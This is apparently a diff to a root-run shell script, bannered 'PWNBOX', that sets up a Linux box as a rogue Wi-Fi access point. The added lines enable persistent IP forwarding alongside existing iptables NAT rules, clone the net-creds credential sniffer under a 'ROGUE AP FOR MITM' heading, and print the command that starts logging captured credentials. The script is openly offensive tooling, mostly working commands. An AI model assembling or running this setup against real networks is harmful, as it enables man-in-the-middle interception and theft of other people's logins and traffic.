@@ -9,6 +9,14 @@
 # VERIFY RUN AS ROOT
 #
 # ---------------------------------------------
+echo "
+██████╗ ██╗    ██╗███╗   ██╗██████╗  ██████╗ ██╗  ██╗
+██╔══██╗██║    ██║████╗  ██║██╔══██╗██╔═══██╗╚██╗██╔╝
+██████╔╝██║ █╗ ██║██╔██╗ ██║██████╔╝██║   ██║ ╚███╔╝
+██╔═══╝ ██║███╗██║██║╚██╗██║██╔══██╗██║   ██║ ██╔██╗
+██║     ╚███╔███╔╝██║ ╚████║██████╔╝╚██████╔╝██╔╝ ██╗
+╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
+"
 if [[ $EUID -ne 0 ]]; then
    echo "Work like a true hacker ! run the script as ROOT !"
    exit 1
@@ -182,4 +190,16 @@ iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACC
 iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
 sh -c "iptables-save > /etc/iptables.ipv4.nat"
 echo "up iptables-restore < /etc/iptables.ipv4.nat" >> /etc/network/interfaces
-
+echo "---------------------------------------------"
+echo "configuring PERSISTENT ROUTING"
+echo "---------------------------------------------"
+sed -ir 's/#{1,}?net.ipv4.ip_forward ?= ?(0|1)/net.ipv4.ip_forward = 1/g' /etc/sysctl.conf
+echo "---------------------------------------------"
+echo "configuring ROGUE AP FOR MITM"
+echo "---------------------------------------------"
+cd /root
+git clone https://github.com/DanMcInerney/net-creds MITMHTTP
+cd MITMHTTP
+echo "you are in : $(pwd)" 
+echo "To start the attack run this cmd line : "
+echo "python net-creds.py -i eth0 >> live_capture.log"
